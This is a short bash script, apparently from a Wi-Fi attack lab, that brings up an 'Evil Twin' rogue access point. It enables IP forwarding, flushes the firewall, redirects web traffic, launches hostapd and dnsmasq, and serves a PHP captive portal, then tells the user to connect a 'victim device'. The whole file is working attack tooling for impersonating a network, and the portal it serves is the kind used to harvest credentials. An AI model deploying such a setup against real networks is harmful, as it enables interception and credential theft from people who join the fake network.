#!/bin/bash

IFACE="wlan0"  # Change interface if needed

echo "[•] Setting up IP forwarding and firewall rules"
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -F
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80

echo "[•] Starting hostapd"
xterm -e "hostapd configs/hostapd.conf" &

sleep 2

echo "[•] Starting dnsmasq"
xterm -e "dnsmasq -C configs/dnsmasq.conf" &

sleep 2

echo "[•] Starting PHP web server"
cd captive_portal
xterm -e "php -S 0.0.0.0:80" &
cd ..

echo "[✔] Evil Twin lab started. Connect your victim device to the rogue AP."
